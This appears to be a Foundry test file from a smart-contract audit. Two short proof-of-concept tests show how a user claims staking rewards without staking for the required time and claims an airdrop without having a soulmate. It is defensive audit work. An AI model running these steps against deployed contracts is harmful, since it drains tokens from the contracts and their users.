// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {BaseTest} from "./BaseTest.t.sol";

contract AuditTest is BaseTest {
    function test_ClaimRewardWithoutStakingLong() public {
        uint256 amount = 10 ether;
        _giveLoveTokenToSoulmates(amount);
        vm.warp(block.timestamp + 7 days + 1 seconds);

        vm.startPrank(soulmate1);
        loveToken.approve(address(stakingContract), amount);
        stakingContract.deposit(amount);
        stakingContract.claimRewards();
        stakingContract.withdraw(amount);
        vm.stopPrank();

        uint256 amountAfter = loveToken.balanceOf(soulmate1);

        assertTrue(amountAfter == 30 ether);
    }

    function test_claimAirdropWithoutSoulmate() public{
        uint256 amountBefore = loveToken.balanceOf(soulmate1);
        // set timestamp in foundry - default is 0
        vm.warp(1707845718);
        vm.startPrank(soulmate1);
        airdropContract.claim();
        vm.stopPrank();

        uint256 amountAfter = loveToken.balanceOf(soulmate1);

        assertTrue(amountAfter > amountBefore);
    }
}
